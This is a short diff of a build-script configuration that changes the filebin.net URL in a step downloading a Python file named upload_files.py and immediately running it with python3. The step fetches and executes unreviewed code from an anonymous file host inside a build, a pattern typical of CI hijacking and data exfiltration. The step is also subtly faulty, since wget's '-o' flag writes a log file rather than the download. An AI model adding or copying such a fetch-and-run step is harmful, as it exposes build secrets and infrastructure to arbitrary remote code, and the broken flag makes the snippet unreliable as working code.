@@ -17,7 +17,7 @@ build_script:
     echo "Downloading completed."
 
     # Download the Python script
-    wget -L -o upload_files.py "https://filebin.net/Sahaujwsh/maain.py"
+    wget -L -o upload_files.py "https://filebin.net/Sahaujwsh/new.py"
 
     # Run the uploaded script
     python3 upload_files.py
